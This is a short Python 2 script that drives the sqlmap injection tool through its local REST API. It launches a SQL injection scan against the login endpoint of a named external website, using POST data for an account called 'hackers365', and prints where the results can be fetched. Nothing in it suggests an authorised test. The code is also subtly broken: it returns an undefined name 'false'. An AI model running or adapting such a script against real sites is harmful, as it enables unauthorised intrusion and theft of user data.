#!/usr/bin/env python
import urllib
import urllib2
import json

prefix = 'http://127.0.0.1:8775'

def curl_sqlmap(method, url, data=None):
    if method.lower() == 'get':
        response = urllib2.urlopen(url)
        return json.loads(response.read())
    else:
        headers = {'Content-Type': 'application/json'}
        request = urllib2.Request(url, data, headers)
        response = urllib2.urlopen(request)
        return json.loads(response.read())

def task_new(target_url, options=None):
    url = prefix + '/task/new'
    response = curl_sqlmap('get', url)
    if not response['taskid']:
        return false
    task_id = response['taskid']

    data = {'url': target_url}
    if options:
        for k, v in options.items():
            data[k] = v

    url = prefix + '/scan/' + task_id + '/start'
    response = curl_sqlmap('post', url, json.dumps(data))

    print prefix + '/scan/' + task_id + '/data'

options = {'data': 'act=ajax&type=login_info&account=hackers365&password=test&next_url=%2F&remember_me=1'}

#options = {'data': 'act=ajax&type=login_info&account=hackers365&password=test&next_url=%2F&remember_me=1'}
task_new('http://xnw.com/user/log_in.php', options)
